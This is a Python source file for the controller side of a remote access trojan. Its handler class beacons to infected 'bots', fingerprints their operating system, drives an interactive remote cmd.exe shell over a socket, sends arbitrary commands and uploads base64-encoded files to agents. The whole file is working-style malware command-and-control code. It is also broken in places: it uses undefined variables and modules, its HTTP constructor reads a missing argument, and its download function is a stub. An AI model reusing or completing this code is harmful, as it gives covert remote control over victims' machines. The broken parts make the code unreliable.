
# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time
import random

class Handler(threading.Thread):

    def __init__(self, *args):
        #tcp signature
        if len(args) == 4:
            threading.Thread.__init__(self)
            self.loggers = args[3]
            self.client = args[0]
            self.client_address = args[1]
            self.ip = client_address[0]
            self.port = client_address[1]
            self.bot_id = args[2]
            self.info = [self.bot_id,self.ip,self.port]
            self.beacon_wait = False
            self.os = ''
            self.interactive = False
            self.transport_type = "tcp"

            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                            # [0] = PING, [1] = BEACON
        #http signature
        elif len(args) == 1:
            threading.Thread.__init__(self)
            self.loggers = args[3]
            self.ip = '127.0.0.1'
            self.port = 5000
            self.address = "http://127.0.0.1:5000"
            self.agent_id = args[0]
            self.info = [self.agent_id,self.ip,self.port]
            self.beacon_wait = False
            self.os = ''
            self.interactive = False
            self.transport_type = "http"
            
            self.status = ["UP","UP"]                       # <--UP - DOWN - ERR 
                                                            # [0] = PING, [1] = BEACON
        # Log by

    # HTTP helper functions
    def api_get_request(endpoint):
        response_raw = requests.get(self.address + endpoint).text
        response_json = json.loads(response_raw)
        return response_json

    def api_post_request(endpoint, payload):
        response_raw = requests.post(self.address + endpoint, json=payload).text
        response_json = json.loads(response_raw)
        return response_json

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[*BotHandler-Msg] Bot {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+self.ip+':'+str(self.port)+' connected with Session ID of '+str(self.bot_id))
        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot handler object created for: '+self.ip+':'+str(self.port)+'; Session ID of '+str(self.bot_id))

        #Not working for http currently (delete if statement once working)
        # Grab operating system : Linux/Windows
        if(self.transport_type == "tcp"):
            self.setOS()
            loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' operating system set: '+str(self.os))
            loggers[0].q_log('conn','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' operating system set: '+str(self.os))


        # Beacon indefinitely??
        self.beacon()


    def kill(self):     # hah
        print(f"\n[*BotHandler-Msg] Severing connection for agent {str(self.bot_id)}...")

        # Log
        loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing connection for agent '+str(self.bot_id))
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for agent '+str(self.bot_id))

        self.execute("kill")

        loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing connection for agent '+str(self.bot_id))
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for agent '+str(self.bot_id))        

    def beacon(self):
        # Log
        loggers[0].q_log('serv','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' beacon started')
        loggers[0].q_log('conn','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' beacon started')
        loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' beacon started')

        while(True):
            time.sleep(random.randint(10,40))
            
#---OLD _ COMPARE
                # ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
                # if ping == 0:
                #     self.status[0] = "UP"
                #     loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - PING : UP')

                # else:
                #     self.status[0] = "DOWN"
                #     loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - PING : DOWN')
#---
            # Check HOST-STATUS
            try:
                # TCP
                if(self.transport_type == "tcp"):
                    ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
                    if ping == 0:
                        self.status[0] = "UP"

                    else:
                        self.status[0] = "DOWN"
                # HTTP
                elif(self.transport_type == "http"):
                    request_payload_string = f'[{{"task_type":"ping","{key}":"{value}"}}]'
                    request_payload = json.loads(request_payload_string)
                    pprint.pprint(api_post_request(api_endpoint, request_payload))

            except:
                self.status[0] = "ERR"
                loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - PING : ERROR')

            # Write to log file - record uptime

            # if self.interactive:
            # Check RAT-STATUS
            if not self.beacon_wait:
                try:
                    msg = self.execute("beacon", True)

                    if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
                        self.status[1] = "UP"
                        loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - BEACON : UP')
                    else:
                        self.status[1] = "DOWN"
                        loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - BEACON : DOWN')

                except:
                    self.status[1] = "ERR"
                    loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.bot_id)+' - BEACON : ERROR')

                                
    def setStatus(self, index0, index1):
        self.status[0] = index0
        self.status[1] = index1

    def stopBeacon(self):
        self.beacon_wait = True

    def startBeacon(self):
        self.beacon_wait = False

    def setOS(self):
        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt", True)
        
    def getOS(self):
        return self.os

    def getInfo(self):
        return self.info

    def printInfo(self):
        print(self.info)

    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port
#------------------------------------------------------------------------------------------------------------------------------
    def shell(self):

        self.beacon_wait = True

        # Initiate shell

        try:
            self.execute("shell", True)             # Signals RAT to initiate cmd.exe process and forward fds to socket
        except Exception as ex:
            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell interaction with agent {self.bot_id} at {str(self.ip)}")
            loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Unable to initiate shell interaction with agent '+str(self.bot_id))
            loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Unable to initiate shell interaction with agent '+str(self.bot_id))
            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))

            self.beacon_wait = False
            return False                            # unsuccessful
        else:

            banner = ""
            while True:
                try:
                    self.client.settimeout(2)
                    recv = self.client.recv(4096).decode('utf-8')
                except socket.timeout:
                    recv = ""
                
                if not recv:
                    break
                else:
                    banner += recv

            if banner:
                print(banner)
        
        time.sleep(0.5)

        while (True):                                                           # Capture IO sent over socket (cmd.exe)
            try:
                cmd_sent = input()                                            # Dumb capture in
                cmd_sent += "\n"
            except Exception as ex:
                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")
                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to parse command')
                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Error: ' + str(ex))

            else:
                try:
                    cmd_response = ""
                    shell_exit = False

                    if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                        print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
                        loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(bot_id))
                        loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Sending EXIT signal to agent: '+str(bot_id))

                        self.client.send(("exit\n").encode('utf-8'))

                        while(True):

                            self.client.settimeout(0.5)

                            try:
                                recv = self.client.recv(4096).decode('utf-8')
                            except socket.timeout:
                                # if timeout exception is triggered - assume no more data
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')
                                loggers[0].q_log('conn','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')

                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                                loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
                                loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))                                
                                break

                            if not recv:
                                break
                            else:
                                cmd_response += recv  
                        
                        shell_exit = True

                    else:

                        self.client.send((cmd_sent).encode('utf-8'))
                        while(True):
                            try:
                                if (cmd_sent.casefold() == "\n"):
                                    self.client.settimeout(0.5)
                                elif (len(cmd_response) <= len(cmd_sent)):
                                    self.client.settimeout(5)
                                else:
                                    self.client.settimeout(1)
                                    
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')
                                # loggers[0].q_log('conn','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')
                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                                # loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
                                loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
                                break

                            if not recv:
                                break
                            else:
                                cmd_response += recv
                    
                except Exception as ex:
                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command '{cmd_sent}' to agent {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                    loggers[0].q_log('serv','warning','[* BotHandler-Msg:ShellExec] Unable to send command: "'+cmd_sent+'" to agent '+self.bot_id+' at '+str(self.ip))
                    loggers[0].q_log('conn','warning','[* BotHandler-Msg:ShellExec] Unable to process received data')
                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                    loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
                    loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Error: '+str(ex))
                else:
                    
                    if len(cmd_response.strip()) > 1:
                        # Removing sent command from response before printing output
                        print(cmd_response.replace(cmd_sent,""))
            
                    if(shell_exit):
                        break

        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with agent #{self.bot_id} at {str(self.ip)}")
        loggers[0].q_log('serv','info','[* BotHandler-Msg:ShellExec] Exiting Shell interaction with agent '+str(self.bot_id)+' at '+str(self.ip))
        loggers[0].q_log('conn','info','[* BotHandler-Msg:ShellExec] Exiting Shell interaction with agent '+str(self.bot_id)+' at '+str(self.ip))

        self.beacon_wait = False
        return True
#------------------------------------------------------------------------------------------------------------------------------
    def execute(self, cmd_sent, suppress=False):

        self.beacon_wait = True
        if not suppress:
            # Log this
            print(f"[* BotHandler-Msg:StdExec] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")
            loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Received command: '+str(cmd_sent)+' for agent '+str(self.bot_id)+' at '+str(self.ip))

        # Single instance execution
        try:
            # Send data/command to RAT
            
            self.client.send(cmd_sent.encode('utf-8'))
        except Exception as ex:
            # Log this
            print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
            loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.bot_id))
            print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
            loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
            
            self.beacon_wait = False
            return "== Return Value Error =="
        else:
            cmd_response = ""
            while(True):
                try:
                    self.client.settimeout(3)
                    recv = self.client.recv(4096).decode('utf-8')

                except socket.timeout:
                    # if timeout exception is triggered - assume no more data
                    recv = ""
                except Exception as ex:
                    # if not suppress:
                    # Log this
                    print("[* BotHandler-Msg:StdExec] Unable to process received data.")
                    loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to process received data from agent '+str(self.bot_id))
                    print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
                    loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))

                    break

                if not recv:
                    break
                else:
                    cmd_response += recv

            self.beacon_wait = False
            return str(cmd_response)
#------------------------------------------------------------------------------------------------------------------------------

    # TODO %%
    def download(self, remotepath, localfile):
        print("TBC")
#------------------------------------------------------------------------------------------------------------------------------

    def upload(self, localfile, remotefile):

        print(f"[* BotHandler-Msg:Upload] Attempting to upload {localfile} to remote file {remotefile} on agent {self.getID()}")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Attempting to upload '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))

        self.beacon_wait = True

        try:
            with open(lf,mode='rb') as file:
                filedata = file.read()
        except FileNotFoundError:
            print(f"[* Interpreter-Msg:Upload] File {localfile} does not exist")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] File "'+str(localfile)+'" does not exist')

            self.beacon_wait = False
            return False
        except Exception as ex:
            print(f"[* Interpreter-Msg:Upload] Unable to read file '{localfile}' ")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Unable to read file '+str(localfile))

            self.beacon_wait = False
            return False

        # Encode file for upload
        print(f"[* Interpreter-Msg:Upload] Encoding {localfile} to send to agent {self.getID()}")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Encoding '+str(localfile)+' to send to agent '+str(self.getID()))
        b64filedata = base64.b64encode(filedata).decode('utf-8')
        b64datalen = len(b64filedata)
            
        # This will send following data to agent:
        # upload <remote-filename> <b64_size>

        try:
            self.execute('upload {} {}'.format(remotefile,b64datalen))
        except Exception as ex:
            print(f"[* Interpreter-Msg:Upload] Unable to send 'upload' initiation to agent {str(self.getID())}")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Unable to send \'upload\' initiation to agent '+str(self.getID()))

            self.beacon_wait = False
            return False
        else:
            print(f"[* Interpreter-Msg:Upload] Upload of file {localfile} to {remotefile} initiated on agent {self.getID()}")
            self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Upload of file '+str(localfile)+' to remote file '+str(remotefile)+' initiated on agent '+str(self.getID()))
            
            # This will then send the file contents to the agent as its expecting
            try:
                time.sleep(0.7)
                print(f"[* Interpreter-Msg:Upload] Attempting to send base64 encoded filedata of {localfile} to remote file {remotefile} on agent {self.getID()}")
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Attempting to send base64 encoded filedata of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID()))
                self.execute(b64filedata)
                time.sleep(1.5)
            except Exception as ex:
                print(f"[* Interpreter-Msg:Upload] Unable to send encoded local file data to agent {str(self.getID())}")
                self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Unable to send encoded local file data to agent '+str(self.getID()))

                self.beacon_wait = False
                return False
        
        print(f"[* Interpreter-Msg:Upload] Upload  of file {localfile} to remote file {remotefile} on agent {self.getID()} determined successful. Please verify with agent.")
        self.loggers[0].q_log('serv','info','[* Interpreter-Msg:Upload] Upload of '+str(localfile)+' to remote file '+str(remotefile)+' on agent '+str(self.getID())+' determined successfule. Please verify with agent.')
        self.beacon_wait = False
        return True